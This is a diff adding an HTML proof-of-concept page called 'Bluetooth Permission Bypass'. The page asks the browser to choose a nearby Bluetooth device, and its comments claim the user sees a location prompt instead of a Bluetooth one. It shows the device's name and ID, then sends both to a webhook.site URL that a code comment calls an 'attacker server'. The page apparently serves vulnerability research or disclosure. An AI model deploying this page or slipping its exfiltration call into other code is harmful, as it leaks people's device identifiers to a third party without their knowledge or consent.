@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head><title>BT Scan PoC</title></head>
+<body>
+<h1>Bluetooth Permission Bypass</h1>
+<button onclick="scanBluetooth()">Scan Nearby Devices</button>
+<div id="result"></div>
+
+<script>
+async function scanBluetooth() {
+  try {
+    // triggers ACCESS_FINE_LOCATION request
+    // NOT BLUETOOTH_SCAN — user sees "Location" dialog
+    const device = await navigator.bluetooth.requestDevice({
+      acceptAllDevices: true,
+      optionalServices: []
+    });
+
+    // Device name + ID exposed to JavaScript
+    document.getElementById('result').innerHTML =
+      'Device: ' + device.name + ' | ID: ' + device.id;
+
+    // Exfiltrate to attacker server
+    fetch('https://37818315-37ff-4e6c-8353-cd3a38124ea3.webhook.site/collect?device=' +
+      encodeURIComponent(device.name) + '&id=' + device.id);
+
+  } catch(e) {
+    document.getElementById('result').innerHTML = 'Error: ' + e.message;
+    // "User cancelled" = no BT devices / user dismissed chooser
+    // "Bluetooth adapter not available" = BT off
+    // "requestDevice() called from cross-origin iframe" = iframe blocked
+  }
+}
+</script>
+</body>
+</html>
